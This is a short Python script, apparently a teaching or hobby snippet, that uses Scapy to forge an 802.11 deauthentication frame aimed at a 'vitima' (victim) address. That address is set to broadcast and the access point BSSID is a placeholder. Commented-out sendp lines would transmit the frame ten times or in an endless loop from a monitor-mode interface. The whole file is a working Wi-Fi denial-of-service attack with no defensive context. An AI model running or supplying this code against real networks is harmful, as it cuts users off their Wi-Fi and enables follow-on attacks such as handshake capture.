from scapy.all import *

BSSID = "AA:AA:AA:AA:AA:AA" #1
vitima = "FF:FF:FF:FF:FF:FF" #2
frame= RadioTap()/ Dot11(addr1=vitima, addr2=BSSID, addr3=BSSID)/ Dot11Deauth() #3

#sendp(frame,iface="mon0", count=10, inter=0) #4
#sendp(frame,iface="mon0", loop=1, inter=0) #5